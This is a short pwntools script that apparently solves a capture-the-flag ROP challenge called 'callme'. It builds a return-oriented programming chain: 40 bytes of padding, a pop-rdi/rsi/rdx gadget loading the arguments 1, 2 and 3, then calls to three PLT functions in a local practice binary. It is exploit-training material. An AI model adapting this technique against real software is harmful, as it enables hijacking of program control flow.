from pwn import *

prog = process("./callme")

payload = "A" * 40

callme_one_plt = p64(0x00401850)
callme_two_plt = p64(0x00401870)
callme_three_plt = p64(0x00401810)

# pop rdi
# pop rsi
# pop rdx
pop_args = p64(0x00401ab0)

one = p64(1)
two = p64(2)
three = p64(3)

payload += pop_args
payload += one
payload += two
payload += three
payload += callme_one_plt

payload += pop_args
payload += one
payload += two
payload += three
payload += callme_two_plt

payload += pop_args
payload += one
payload += two
payload += three
payload += callme_three_plt

open('payload', 'w').write(payload)

print prog.recvuntil(">")

prog.clean()

prog.sendline(payload)

prog.interactive()
